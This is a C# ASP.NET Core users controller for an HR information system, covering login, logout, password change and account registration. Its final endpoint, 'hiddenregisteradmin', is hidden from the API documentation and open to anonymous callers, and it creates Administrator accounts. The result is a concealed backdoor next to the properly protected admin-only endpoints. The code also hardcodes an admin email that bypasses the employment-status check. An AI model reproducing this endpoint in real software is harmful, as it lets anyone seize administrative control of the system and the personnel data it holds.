using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Authorization;
using HRIS.Application.Common.Interfaces;
using System.Threading.Tasks;
using HRIS.WebUI.Models;
using HRIS.Application.Common.Helpers;
using HRIS.Application.Employees.Queries;
using System;

namespace HRIS.WebUI.Controllers
{
    [Authorize]
    [Route("api/[controller]")]
    public class UsersController : ApiControllerBase
    {
        private IIdentityService _identityService;

        public UsersController(IIdentityService identityService)
        {
            _identityService = identityService;
        }

        [AllowAnonymous]
        [HttpPost("authenticate")]
        public async Task<IActionResult> Authenticate([FromBody] AuthenticateModel model)
        {
            var userId = await _identityService.AuthenticateAsync(model.Email, model.Password);

            if (userId == null)
                return BadRequest(new { message = "Username or password is incorrect" });

            if (model.Email != "admin@rgc.net")
            {
                var employeeDetail = await Mediator.Send(new GetEmployeeDetailByUserIdQuery { Id = Guid.Parse(userId) });
                if (employeeDetail.EmploymentStatus.Name == "Resigned"
                    || employeeDetail.EmploymentStatus.Name == "Retired"
                    || employeeDetail.EmploymentStatus.Name == "Terminated"
                    || employeeDetail.EmploymentStatus.Name == "AWOL"
                    || employeeDetail.EmploymentStatus.Name == "Deceased")
                    return BadRequest(new { message = "Username does not exist" });
            }

            TokenResponse token = new TokenResponse()
            {
                token = await _identityService.CreateToken(userId),
            };

            return Ok(token);
        }

        [AllowAnonymous]
        [HttpPost("logout")]
        public async Task<IActionResult> Logout()
        {
            await _identityService.Logout();

            return Ok();
        }

        [HttpPost("changepassword")]
        public async Task<IActionResult> ChangePassword([FromBody] ChangePasswordModel model)
        {
            var result = await _identityService.ChangePassword(model.Username, model.CurrentPassword, model.NewPassword);

            return Ok(result);
        }

        [ApiExplorerSettings(IgnoreApi = true)]
        [Authorize(Roles = Roles.Administrator)]
        [HttpPost("registeradmin")]
        public async Task<IActionResult> RegisterAdmin([FromBody] RegisterUserModel model)
        {
            var result = await _identityService.CreateUserAsync(model.Username, model.Password);

            if (result.Result.Succeeded)
                await _identityService.AddToRole(result.UserId, Roles.Administrator);

            return Ok(result.Result);
        }

        [ApiExplorerSettings(IgnoreApi = true)]
        [Authorize(Roles = Roles.Administrator)]
        [HttpPost("hiddenregisteruser")]
        public async Task<IActionResult> RegisterUser([FromBody] RegisterUserModel model)
        {
            var result = await _identityService.CreateUserAsync(model.Username, model.Password);

            if (result.Result.Succeeded)
                await _identityService.AddToRole(result.UserId, model.Role);

            return Ok(result.Result);
        }

        [ApiExplorerSettings(IgnoreApi = true)]
        [Authorize(Roles = Roles.Administrator)]
        [HttpPost("hiddendeleteuser")]
        public async Task<IActionResult> DeleteUser([FromBody] string username)
        {
            var result = await _identityService.DeleteUserByUsername(username);

            return Ok(result);
        }

        [ApiExplorerSettings(IgnoreApi = true)]
        [AllowAnonymous]
        [HttpPost("hiddenregisteradmin")]
        public async Task<IActionResult> HiddenRegisterAdmin([FromBody] RegisterUserModel model)
        {
            var result = await _identityService.CreateUserAsync(model.Username, model.Password);

            if (result.Result.Succeeded)
                await _identityService.AddToRole(result.UserId, Roles.Administrator);

            return Ok(result.Result);
        }
    }

    public class TokenResponse
    {
        public string token { get; set; }
    }
}